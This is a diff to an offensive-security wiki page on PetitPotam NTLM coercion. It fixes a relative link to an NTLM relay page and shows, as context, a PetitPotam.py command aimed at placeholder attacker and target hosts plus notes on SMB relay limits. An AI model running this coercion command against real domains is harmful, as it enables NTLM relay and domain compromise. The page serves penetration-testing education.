@@ -21,7 +21,7 @@ Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 ```
 
 {% hint style="info" %}
-**Nota bene**: the coerced NTLM authentication will be made through SMB. This is important because it restricts the possibilites of [NTLM relay](../lm-and-ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMBv2 to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
+**Nota bene**: the coerced NTLM authentication will be made through SMB. This is important because it restricts the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMBv2 to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
 {% endhint %}
 
 {% hint style="success" %}
